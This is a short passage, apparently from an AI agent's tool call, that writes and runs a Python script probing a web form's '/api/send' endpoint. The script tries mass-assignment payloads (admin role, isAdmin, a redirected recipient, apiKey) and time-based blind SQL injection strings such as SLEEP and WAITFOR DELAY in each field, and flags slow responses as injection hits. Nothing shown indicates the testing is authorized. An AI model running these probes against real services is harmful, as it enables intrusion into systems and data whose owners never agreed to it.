]),flush=True); time.sleep(1)\nprint(\"\\n== mass assignment ==\",flush=True)\nfor extra in [{'role':'admin'},{'isAdmin':True},{'to':'attacker@invalid.example'},{'apiKey':'x'}]:\n    r,el=post('name','IC Probe',extra); print(\"  %s :: %r :: %s\"%(r.status_code,r.content[:160],extra),flush=True); time.sleep(1)\nprint(\"\\n== time-based blind SQLi per field ==\",flush=True)\nfor f in ['name','email','subject','message','targets']:\n    for v in [\"' AND SLEEP(6)-- -\", \"1; WAITFOR DELAY '0:0:6'--\", \"1 AND SLEEP(6)\"]:\n        t=time.time(); r=s.post(B+'/api/send', json={'name':'a','email':'a@b.c','subject':'a','message':'a','targets':'a@b.c',f:v}, timeout=40)\n        el=time.time()-t\n        print(\"  %-8s %s %.2fs :: %s\"%(f,r.status_code,el,v[:35]),flush=True)\n        if el>5: print(\"   *** TIME-BASED ORACLE HIT ***\",flush=True)\nPYEOF\npython3 /tmp/w16/p16c.py 2>&1 | head -60"}
